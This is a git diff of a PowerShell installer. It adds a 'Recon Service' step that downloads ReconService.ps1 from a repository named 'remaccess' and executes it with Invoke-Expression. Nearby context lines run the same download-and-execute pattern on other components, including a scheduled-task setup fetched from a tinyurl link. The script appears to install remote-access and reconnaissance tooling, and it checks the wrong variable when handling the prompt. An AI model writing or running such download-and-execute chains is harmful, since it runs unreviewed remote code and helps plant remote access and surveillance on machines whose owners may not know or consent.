@@ -35,6 +35,17 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 if ($prompt.ToLower() -eq "y") {
     Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 } else {}
+#Recon Service
+$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$prompt = Read-Host "Proceed With $Name Install (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
+}
+if ($prompt.ToLower() -eq "y") {
+    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+} else {}
 #Scheduled Task
 $url = "https://tinyurl.com/taskschedulersetup"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
